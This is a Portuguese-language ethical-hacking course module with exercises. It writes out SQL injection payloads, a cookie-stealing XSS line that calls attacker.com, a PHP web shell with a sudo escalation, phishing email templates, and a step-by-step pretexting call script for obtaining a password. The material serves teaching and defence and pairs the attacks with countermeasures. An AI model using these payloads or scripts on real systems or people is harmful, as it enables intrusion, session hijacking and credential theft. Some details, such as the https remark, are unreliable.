# 📖 Módulo 6: Ethical Hacking

## 🎯 Objetivos do Módulo

- Entender princípios de hacking ético
- Aprender técnicas de exploração avançadas
- Técnicas de social engineering
- Implementar defesas contra ataques

---

## 6.1 O que é Ethical Hacking?

**Definição**: Uso de técnicas de hacking com autorização explícita para testar e melhorar a segurança de sistemas.

### Hacker vs Ethical Hacker

```
HACKER CRIMINOSO:
├─ Objetivo: Lucro, roubo, destruição
├─ Autorização: ❌ NENHUMA
├─ Legal: ❌ ILEGAL
├─ Consequências: Prisão (2-10 anos)
└─ Ética: ❌ Nenhuma

ETHICAL HACKER (CEH):
├─ Objetivo: Melhorar segurança
├─ Autorização: ✅ ESCRITA E ASSINADA
├─ Legal: ✅ LEGAL (com contrato)
├─ Consequências: Remuneração
└─ Ética: ✅ Código de conduta

DIFERENÇA LEGAL:
Hacker: Acesso não autorizado é crime
Ethical Hacker: Autorização muda tudo!
```

### Certificações em Ethical Hacking

```
CEH (Certified Ethical Hacker):
├─ Provedor: EC-Council
├─ Requisitos: 2+ anos experiência
├─ Tópicos: 5 domínios
├─ Valor de mercado: $120-180k/ano

OSCP (Offensive Security Certified Professional):
├─ Provedor: Offensive Security
├─ Requisitos: Experiência em Linux/Windows
├─ Teste: 24 horas de prova prática
├─ Valor: Muito respeitado (melhor que CEH)

GPEN (GIAC Penetration Tester):
├─ Provedor: GIAC/SANS
├─ Custo: ~$7000 por curso
├─ Requisitos: Treinamento SANS
```

---

## 6.2 Técnicas Avançadas de Exploração

### SQL Injection Avançado

```
SQL Injection Básico:
$ curl "http://site.com/user?id=1' OR '1'='1"

Explicação:
Original Query: SELECT * FROM users WHERE id = 1
Injetado: SELECT * FROM users WHERE id = 1' OR '1'='1

Problema: OR '1'='1 sempre é verdadeiro!
Resultado: Retorna TODOS os usuários

SQL Injection Avançado - Blind SQLi:
Quando a aplicação não mostra dados diretamente

Técnica Time-Based:
$ curl "http://site.com/user?id=1' AND SLEEP(5)--"

Se leva 5 segundos para responder:
├─ Condição é TRUE
└─ Banco tem dados

Extração Caractere por Caractere:
' AND IF(SUBSTRING(password,1,1)='a',SLEEP(5),0)--

Se demora 5s: primeiro caractere é 'a'
Se não demora: não é 'a'

Repetir para cada caractere até descobrir senha inteira!

Exemplo Completo:
' UNION SELECT 1,2,3,4,5--
' UNION SELECT table_name,2,3,4,5 FROM information_schema.tables--
' UNION SELECT column_name,2,3,4,5 FROM information_schema.columns--
' UNION SELECT username,password,3,4,5 FROM admin_users--

Resultado: Todos admin usernames e passwords!
```

### Cross-Site Scripting (XSS)

```
XSS Armazenado (Stored XSS) - CRÍTICO:
1. Atacante injeta script em comentário:
   <img src=x onerror="fetch('http://attacker.com/steal.php?cookie=' + document.cookie)">

2. Script é armazenado no banco
3. Todo usuário que vê comentário:
   - Script executa no navegador deles
   - Cookies são enviados para attacker.com
   - Atacante obtém cookie de sessão

4. Usando cookie, atacante faz login como vítima!

Exemplos de Payload XSS:
<script>alert('XSS')</script>
<img src=x onerror="alert('XSS')">
<svg onload="alert('XSS')">
<iframe src="javascript:alert('XSS')"></iframe>
<body onload="alert('XSS')">

Impacto:
✅ Roubo de cookies (session hijacking)
✅ Roubo de credenciais (form hijacking)
✅ Malware delivery
✅ Defacement (alteração de site)
```

### Remote Code Execution (RCE)

```
Via Upload de Arquivo:
1. Aplicação permite upload de imagem
2. Atacante faz upload de PHP:

<?php system($_GET['cmd']); ?>

Nomeado como: image.jpg.php

3. Acessa: http://site.com/upload/image.jpg.php?cmd=whoami

Resultado: Comando whoami executado no servidor!
Output: www-data (usuário do Apache)

Escalação:
$ whoami
www-data

$ cat /etc/passwd | grep root
root:x:0:0:root:/root:/bin/bash

$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

Objetivo: Escalação para ROOT

Buscar falhas de escalação:
$ sudo -l
User www-data may run the following commands without password:
(root) ALL

$ sudo bash
root@server:/#

ACESSO ROOT OBTIDO!
```

---

## 6.3 Social Engineering

### Técnicas de Social Engineering

#### Phishing

```
Email de Phishing Convincente:

FROM: support@amazon-security.com
TO: victim@gmail.com
SUBJECT: Atividade Suspeita Detectada em Sua Conta

Corpo:
Detectamos login de local desconhecido.
Clique para verificar sua conta:
https://amaz0n-security-verify.tk/login

[Clique aqui para verificar]

Página Falsa:
├─ Visual idêntico ao Amazon real
├─ Formulário de login
├─ Envia credenciais para attacker.com/steal.php
├─ Redireciona para Amazon real (vítima não percebe)

Taxa de Sucesso: ~30-50%

Análise Técnica:
1. Domínio suspeito (amaz0n em vez de amazon)
2. Email do "suporte" não é oficial
3. Link não é https seguro
```

#### Pretexting

```
Cenário: Atacante liga para vítima

Atacante: "Oi, sou da TI da empresa. Preciso resetar sua senha por segurança."
Vítima: "Ok..."

Atacante: "Qual é seu nome de usuário?"
Vítima: "maria.silva"

Atacante: "Qual é sua senha atual para validar?"
Vítima: "abc123456"

Atacante: "Obrigado, acabei de resetar. Sua nova senha é: TempPass123"

Resultado: Atacante tem credenciais de maria.silva!

Defesa:
- Validar identidade do "TI"
- TI nunca pede senha
- Desconfiar de ligações inesperadas
```

#### Baiting

```
Cenário: USB deixado no estacionamento

Rótulo: "SALÁRIOS 2026 - CONFIDENCIAL"

Vítima encontra e coloca no computador:
├─ Autorun.inf ativa script
├─ Script baixa backdoor
├─ Computador infectado

Resultado: Acesso corporativo comprometido
```

---

## 📝 Exercícios - Módulo 6

### Exercício 6.1: Análise de Email de Phishing

**Cenário**: Recebido o seguinte email:

```
FROM: noreply@banc0-central.com.br
TO: client@example.com
DATE: 2026-06-03 14:32:00
SUBJECT: Seu CPF foi bloqueado! Ação imediata necessária

Corpo:
Prezado cliente,

Detectamos atividade suspeita em sua conta.
Seu CPF foi BLOQUEADO por segurança.

Para desbloqueá-lo, CLIQUE AQUI IMEDIATAMENTE:
https://banc0-central-seguranca.tk/verify?token=abc123

Atenciosamente,
Banco Central do Brasil
Departamento de Segurança

[Rodapé com logos do Banco Central]
```

**Questão**: Identifique indicadores de phishing.

### ✅ Resolução

```
ANÁLISE FORENSE DO EMAIL:

1. ANÁLISE DO REMETENTE (FROM):
   ❌ banc0-central.com.br
   Domínio real: banco-central.gov.br
   Diferença: "banc0" (zero em vez de letra 'o')
   Técnica: Typosquatting
   Risco: CRÍTICO

2. ENDEREÇO DO REMETENTE:
   ❌ noreply@banc0-central.com.br
   Problema: Endereço genérico
   Banco real: contato@banco-central.gov.br
   Indicador: Genérico demais

3. ASSUNTO:
   ❌ "Seu CPF foi bloqueado! Ação imediata necessária"
   Tática: Urgência + Medo
   Psicologia: FOMO (Fear Of Missing Out)
   Resultado: Vítima clica sem pensar

4. CORPO DO EMAIL:
   ❌ "BLOQUEADO por segurança"
   ❌ "CLIQUE AQUI IMEDIATAMENTE"
   ❌ "Ação imediata necessária"
   Tática: Urgência artificial
   Objetivo: Contornar pensamento crítico

5. LINK SUSPEITO:
   ❌ https://banc0-central-seguranca.tk/verify?token=abc123
   
   Análise de URL:
   ┌─────────────────────────────────┐
   │ https://banc0-central-            │
   │        seguranca.tk/verify        │
   ├─────────────────────────────────┤
   │ Protocolo: https (OK, TLS)       │
   │ Domínio: banc0-central-seguranca │
   │ TLD: .tk (Gratuito - Red Flag!)  │
   │ Path: /verify                    │
   │ Parameter: token=abc123          │
   └─────────────────────────────────┘
   
   Problemas:
   ❌ Domínio não é banco-central.gov.br
   ❌ Domínio .tk é gratuito (qualquer um pode usar)
   ❌ Parameter token é genérico
   ✅ HTTPS está correto (mas não garante legitimidade)

6. RODAPÉ COM LOGOS:
   ❌ "Logos do Banco Central"
   Tática: Aumentar credibilidade
   Análise: Logos podem ser screenshots copiados
   Verificação: Logos não vinculados a site oficial

7. DADOS PESSOAIS SOLICITADOS:
   O email implica que CPF está em risco
   Objetivo: Vítima entra em pânico
   Resultado: Clica no link sem verificar
   Na página falsa: Pede CPF + Senha + Data de Nascimento

INDICADORES DE PHISHING RESUMIDOS:

┌──────────────────────────────────┐
│ 🚩 RED FLAGS IDENTIFICADAS:      │
├──────────────────────────────────┤
│ 1. Typosquatting no domínio      │
│ 2. TLD .tk (gratuito)            │
│ 3. Urgência artificial           │
│ 4. Link não é domínio real       │
│ 5. Endereço noreply genérico     │
│ 6. Solicitação de dados pessoais │
│ 7. Logos copiadas                │
└──────────────────────────────────┘

PROBABILIDADE DE PHISHING: 99.9%

RECOMENDAÇÃO:
1. NÃO CLIQUE NO LINK
2. NÃO FORNEÇA DADOS PESSOAIS
3. DENUNCIE COMO SPAM
4. Acesse site.com.br diretamente (manualmente)
5. Contate banco pelo número oficial
```

---

### Exercício 6.2: Planejar Ataque de Social Engineering

**Cenário**: Você é ethical hacker contratado por empresa XYZ. Objetivo: Obter credenciais de funcionário.

**Questão**: Descreva cenário plausível de pretexting.

### ✅ Resolução

```
CENÁRIO DE PRETEXTING:

FASE 1: RECONHECIMENTO
├─ Target: maria.silva@company.com
├─ Cargo: Gerente de TI
├─ Empresa: XYZ Corporation
├─ LinkedIn: maria.silva encontrada
│  ├─ Experiência: 8 anos em TI
│  ├─ Habilidades: Windows, Linux, networks
│  └─ Foto: Fornece credibilidade
├─ Telefone: +55 11 3000-1234 (site da empresa)
└─ Departamento: TI

FASE 2: DESENVOLVIMENTO DO PRETEXTO

Pretexto Escolhido: "Auditoria de Segurança Trimestral"

Razões para escolher:
✅ Comum em empresas grandes
✅ Justifica pedidos de informações
✅ Cria senso de autoridade
✅ Funcionários estão acostumados
✅ Maria como Gerente TI foi consultada antes

FASE 3: PREPARAÇÃO

Materiais:
1. Roteiro de conversa (script)
2. Informações sobre auditoria
3. Número similar ao TI da empresa
4. Email falso (lookalike domain)
5. Documentos PDF de auditoria

Exemplo de Email Pré-Ataque:
FROM: auditor@company-security-check.tk
TO: maria.silva@company.com
SUBJECT: Auditoria de Segurança - Validação de Acesso

Corpo:
Prezada Maria,

Como parte da auditoria de segurança trimestral,
precisamos validar credenciais de acesso dos gerentes.

Você será contatado em breve por nosso auditor.

Código de validação: AUD-2026-06-03-789

Documento anexado: Política_Auditoria_2026.pdf

FASE 4: EXECUÇÃO

Dia D:
09:00 - Email pré-ataque enviado
09:15 - Telefonema do "auditor"

Telefonema:
Atacante: "Oi Maria, tudo bem? Sou João, da auditoria externa."
Maria: "Oi, recebi seu email."

Atacante: "Perfeito! Vi que você é Gerente de TI. Preciso validar algumas informações para os registros."

Maria: "Ok, diga me o que precisa."

Atacante: "Primeiro, qual é seu nome completo para registro?"
Maria: "Maria Silva"

Atacante: "E seu CPF para validação?"
Maria: "123.456.789-00"

Atacante: "Ótimo. Agora, para completar a auditoria, qual é seu usuário de login na empresa?"
Maria: "maria.silva"

Atacante: "E para validação de backup de senha, qual você usa habitualmente?"
Maria: "Ah, normalmente uso... [fornece senha]"

Atacante: "Perfeito Maria! Você é a terceira pessoa que valida. Isto está tomando mais tempo que esperado. Sabe, nós da auditoria temos que validar estes dados com a TI. Pode ser que alguém ligue para você confirmando. Está ok?"
Maria: "Claro, sem problema."

Atacante: "Obrigado Maria, foi rápido! Você foi ótima na colaboração. Até mais!"

RESULTADO:
✅ Username: maria.silva
✅ Senha: [obtida]
✅ CPF: 123.456.789-00
✅ Email: maria.silva@company.com

FASE 5: EXPLORAÇÃO

Com credenciais:
1. Faz login no sistema da empresa
2. Enumera outras contas no AD (Active Directory)
3. Acessa arquivos compartilhados
4. Busca por documentos confidenciais
5. Extrai database de clientes

ANÁLISE TÁTICA:

Por que Funcionou?
✅ Maria é gerente TI → familiaridade com auditorias
✅ Email pré-ataque criou contexto
✅ Código de validação aumentou credibilidade
✅ Chamada pareceu legítima (tom profissional)
✅ Urgência (outros já foram validados)
✅ Fechamento amigável (não despertou suspeita)

Pontos Fracos Identificados:
❌ Maria compartilhou senha em ligação (NÃO FAZER!)
❌ Não verificou identidade do "auditor"
❌ Acreditou em código de validação aleatório
❌ Não confirmou via IT department
❌ Não hesitou antes de responder

DEFESA CONTRA ESTE ATAQUE:

Treinamento de Funcionários:
✅ TI nunca pede senha
✅ Sempre verificar identidade
✅ Usar número corporativo verificado
✅ Desconfiar de urgência artificial
✅ Confirmar via outro canal

Controles Técnicos:
✅ 2FA/MFA obrigatório
✅ Monitoramento de logins fora do horário
✅ Restrição de IP (só da rede corporativa)
✅ Alertas de login em novo dispositivo
```

---

## 🎓 Resumo do Módulo 6

✅ Ethical hacking requer autorização escrita
✅ SQL Injection permite extração completa de dados
✅ XSS pode roubar sessões de usuários
✅ Social engineering explora psicologia, não tecnologia
✅ Defesa é educação + tecnologia

---

## 📚 Recursos Complementares

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [HackerOne (Bug Bounty)](https://www.hackerone.com/)
- [TryHackMe (Praticar)](https://tryhackme.com/)
- [SecurityAwareness Training](https://www.sans.org/security-awareness/)

